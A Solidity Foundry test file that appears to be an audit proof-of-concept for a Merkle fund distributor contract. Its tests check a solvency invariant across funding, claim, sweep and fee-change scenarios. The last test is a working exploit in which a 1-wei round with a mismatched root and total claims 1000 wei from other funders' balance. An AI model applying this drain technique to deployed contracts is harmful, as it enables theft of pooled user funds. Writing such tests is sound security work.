// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {MerkleFundDistributor} from "src/merkle/MerkleFundDistributor.sol";
import {IMerkleFundDistributor} from "interfaces/IMerkleFundDistributor.sol";
import {IMerkleSnapshot} from "interfaces/merkle/IMerkleSnapshot.sol";

contract QuillSnapshotStub is IMerkleSnapshot {
    MerkleState internal _state;

    function set(bytes32 root, uint256 totalValue) external {
        _state = MerkleState({
            blockNumber: block.number,
            timestamp: block.timestamp,
            root: root,
            ipfsHash: keccak256("blob"),
            ipfsHashCid: "bafyquill",
            totalValue: totalValue
        });
    }

    function getLatestState() external view returns (MerkleState memory) {
        if (_state.root == bytes32(0)) revert NoMerkleStates();
        return _state;
    }
}

contract QuillToken is ERC20 {
    constructor() ERC20("Quill", "QLL") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @notice Fee-on-transfer token: 1% burned on every transfer.
contract QuillFeeToken is ERC20 {
    constructor() ERC20("QuillFee", "QFEE") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function _update(address from, address to, uint256 value) internal override {
        if (from == address(0) || to == address(0)) {
            super._update(from, to, value);
            return;
        }
        uint256 fee = value / 100;
        super._update(from, to, value - fee);
        super._update(from, address(0), fee);
    }
}

/// @notice state-invariant-detection PoC for `MerkleFundDistributor`.
///
/// Invariant under test (Type 2, conservation / solvency), per token T:
///
///   balanceOf(distributor, T)
///       >= SUM over distributions d with token == T of
///          (amountFunded_d - feeAmount_d - amountDistributed_d - sweptAmount_d)
///
/// and the per-round bound that makes the sum meaningful:
///
///   amountDistributed_d <= amountFunded_d - feeAmount_d          (never checked in code)
///
/// The first two tests confirm the H-1 measured-balance-delta accounting DOES conserve across
/// multiple rounds of the same token, fee-on-transfer funding, partial claims, deadline expiry
/// and sweep, and a mid-life fee change. The last test shows the per-round bound is absent, so
/// a round whose (root, totalValue) pair is inconsistent is NOT contained to its own funding:
/// it spends other funders' money out of the shared token balance.
contract QuillStateInv_DistributorConservation is Test {
    MerkleFundDistributor internal dist;
    QuillSnapshotStub internal snap;
    QuillToken internal token;
    QuillFeeToken internal feeToken;

    address internal owner = address(0x0FEE);
    address internal feeRecipient = address(0xFEE1);
    address internal funderA = address(0xA11CE);
    address internal funderB = address(0xB0B);

    // Single-leaf trees: root == leaf, empty proof.
    function _leaf(address account, uint256 value) internal pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(account, value))));
    }

    function setUp() public {
        snap = new QuillSnapshotStub();
        token = new QuillToken();
        feeToken = new QuillFeeToken();
        // 10% protocol fee, allowlist DISABLED - the factory's own default is `false`, i.e.
        // `distribute` is permissionless on every factory-created fund.
        dist = new MerkleFundDistributor(owner, address(snap), feeRecipient, 1e17, false);
    }

    /// SUM of the per-round liabilities for `t`. Saturating, because a round that has paid out
    /// more than it was funded with makes the per-round term go negative - which is itself the
    /// broken invariant, so it is reported separately by `_overpaid`.
    function _liability(address t) internal view returns (uint256 total) {
        uint256 n = dist.getDistributionCount();
        for (uint256 i; i < n; ++i) {
            IMerkleFundDistributor.DistributionState memory d = dist.getDistribution(i);
            if (d.token != t) continue;
            uint256 spent = d.amountDistributed + d.sweptAmount;
            uint256 budget = d.amountFunded - d.feeAmount;
            total += spent >= budget ? 0 : budget - spent;
        }
    }

    /// How much a single round has paid out beyond its OWN funding.
    function _overpaid(uint256 index) internal view returns (uint256) {
        IMerkleFundDistributor.DistributionState memory d = dist.getDistribution(index);
        uint256 spent = d.amountDistributed + d.sweptAmount;
        uint256 budget = d.amountFunded - d.feeAmount;
        return spent > budget ? spent - budget : 0;
    }

    function _assertSolvent(address t) internal view {
        uint256 bal = t == address(0) ? address(dist).balance : QuillToken(t).balanceOf(address(dist));
        assertGe(bal, _liability(t), "CONSERVATION BROKEN: balance below booked liability");
    }

    /// Multiple rounds of the same ERC20, partial claims, deadline + sweep, fee change mid-life.
    function test_ConservationHoldsAcrossRoundsClaimsSweepAndFeeChange() public {
        address alice = address(0xA1);
        address bob = address(0xB1);

        // Round 0: one leaf (alice, 100) of a 100-total tree, no deadline.
        snap.set(_leaf(alice, 100), 100);
        token.mint(funderA, 1_000 ether);
        vm.startPrank(funderA);
        token.approve(address(dist), type(uint256).max);
        uint256 r0 = dist.distribute(address(token), 100 ether, bytes32(0));
        vm.stopPrank();
        _assertSolvent(address(token));

        // Round 1: same token, a different tree with a claim deadline.
        snap.set(_leaf(bob, 40), 100);
        token.mint(funderB, 1_000 ether);
        vm.startPrank(funderB);
        token.approve(address(dist), type(uint256).max);
        uint256 r1 = dist.distribute(address(token), 200 ether, bytes32(0), uint64(block.timestamp + 7 days));
        vm.stopPrank();
        _assertSolvent(address(token));

        // The owner raises the fee mid-life. It must not retroactively touch a booked round.
        vm.prank(owner);
        dist.setFeePercentage(5e17);
        vm.warp(block.timestamp + 4 days);
        dist.applyFeePercentageIncrease();
        assertEq(dist.feePercentage(), 5e17);
        assertEq(dist.getDistribution(r0).feeAmount, 10 ether, "round 0 fee must stay at the booked rate");
        _assertSolvent(address(token));

        // Partial claim on round 1 (bob holds 40 of 100).
        bytes32[] memory noProof = new bytes32[](0);
        dist.claim(r1, bob, 40, noProof);
        assertEq(token.balanceOf(bob), (200 ether - 20 ether) * 40 / 100);
        _assertSolvent(address(token));

        // Claim on round 0 (alice holds the whole tree).
        dist.claim(r0, alice, 100, noProof);
        _assertSolvent(address(token));

        // Deadline passes; the remainder of round 1 (including rounding dust) sweeps to its funder.
        vm.warp(block.timestamp + 8 days);
        uint256 swept = dist.sweep(r1);
        assertEq(swept, (200 ether - 20 ether) - ((200 ether - 20 ether) * 40 / 100));
        _assertSolvent(address(token));
        assertEq(_liability(address(token)), 0, "all rounds fully settled");
    }

    /// Fee-on-transfer funding: `funded` is the measured delta, so a round can only ever draw on
    /// what actually arrived. (This is the H-1 fix; it holds.)
    function test_ConservationHoldsForFeeOnTransferFunding() public {
        address alice = address(0xA1);
        snap.set(_leaf(alice, 100), 100);

        // An honest round of the SAME token funded first, so a mis-booking would be visible.
        feeToken.mint(funderA, 1_000 ether);
        vm.startPrank(funderA);
        feeToken.approve(address(dist), type(uint256).max);
        dist.distribute(address(feeToken), 100 ether, bytes32(0));
        vm.stopPrank();

        feeToken.mint(funderB, 1_000 ether);
        vm.startPrank(funderB);
        feeToken.approve(address(dist), type(uint256).max);
        uint256 r1 = dist.distribute(address(feeToken), 100 ether, bytes32(0));
        vm.stopPrank();

        IMerkleFundDistributor.DistributionState memory d = dist.getDistribution(r1);
        assertEq(d.amountFunded, 99 ether, "books the measured delta, not the requested amount");
        assertGe(feeToken.balanceOf(address(dist)), _liability(address(feeToken)));

        bytes32[] memory noProof = new bytes32[](0);
        dist.claim(r1, alice, 100, noProof);
        assertGe(feeToken.balanceOf(address(dist)), _liability(address(feeToken)));
    }

    /// The missing per-round bound. `claim` computes
    ///     claimedAmount = mulDiv(amountFunded - feeAmount, value, totalMerkleValue)
    /// and never checks it against the round's own remaining funding. All rounds of a token share
    /// one balance, so a round with an inconsistent (root, totalValue) pair spends OTHER funders'
    /// money rather than reverting on its own books.
    function test_MissingPerRoundCapLetsOneRoundSpendAnotherRoundsFunding() public {
        address alice = address(0xA1);
        address attacker = address(0xBAD);

        // Two honest rounds, funded by two different people, same token.
        snap.set(_leaf(alice, 100), 100);
        token.mint(funderA, 1_000 ether);
        vm.startPrank(funderA);
        token.approve(address(dist), type(uint256).max);
        uint256 r0 = dist.distribute(address(token), 100 ether, bytes32(0));
        vm.stopPrank();

        token.mint(funderB, 1_000 ether);
        vm.startPrank(funderB);
        token.approve(address(dist), type(uint256).max);
        uint256 r1 = dist.distribute(address(token), 100 ether, bytes32(0));
        vm.stopPrank();

        uint256 honestLiability = _liability(address(token));
        assertEq(token.balanceOf(address(dist)), honestLiability);

        // A state whose committed `totalValue` is smaller than the value of a leaf in its root.
        // `distribute` accepts any (root, totalValue) the bound snapshot reports; nothing in the
        // distributor cross-checks them.
        snap.set(_leaf(attacker, 1_000), 1);

        // The attacker opens their own round with ONE WEI of funding. `distribute` is
        // permissionless while the allowlist is off.
        token.mint(attacker, 1 ether);
        vm.startPrank(attacker);
        token.approve(address(dist), type(uint256).max);
        uint256 rBad = dist.distribute(address(token), 1, bytes32(0));
        vm.stopPrank();

        IMerkleFundDistributor.DistributionState memory bad = dist.getDistribution(rBad);
        assertEq(bad.amountFunded, 1, "the attacker's round is funded with 1 wei");

        bytes32[] memory noProof = new bytes32[](0);
        uint256 before = token.balanceOf(attacker);
        dist.claim(rBad, attacker, 1_000, noProof);
        uint256 gained = token.balanceOf(attacker) - before;

        // 1 wei in, 1000 wei out - the round paid out 1000x its own funding, from the balance that
        // belonged to rounds 0 and 1.
        assertEq(gained, 1_000, "round paid out far more than it was funded with");
        assertGt(dist.getDistribution(rBad).amountDistributed, bad.amountFunded - bad.feeAmount);

        // BROKEN INVARIANT #1: the round spent 999 wei more than it was ever funded with.
        assertEq(_overpaid(rBad), 999, "round paid out beyond its own funding");

        // BROKEN INVARIANT #2: the shortfall lands on the OTHER funders. The two honest rounds are
        // still booked at their full remaining liability, but the shared token balance no longer
        // covers it.
        assertLt(
            token.balanceOf(address(dist)),
            _liability(address(token)),
            "expected the shared balance to fall below the booked liability"
        );
        assertEq(honestLiability - _liability(address(token)), 0, "honest rounds' books are untouched");
        assertEq(
            honestLiability - token.balanceOf(address(dist)) + 1, 1000, "shortfall equals the overpayment"
        );
        assertEq(r0, 0);
        assertEq(r1, 1);
    }
}
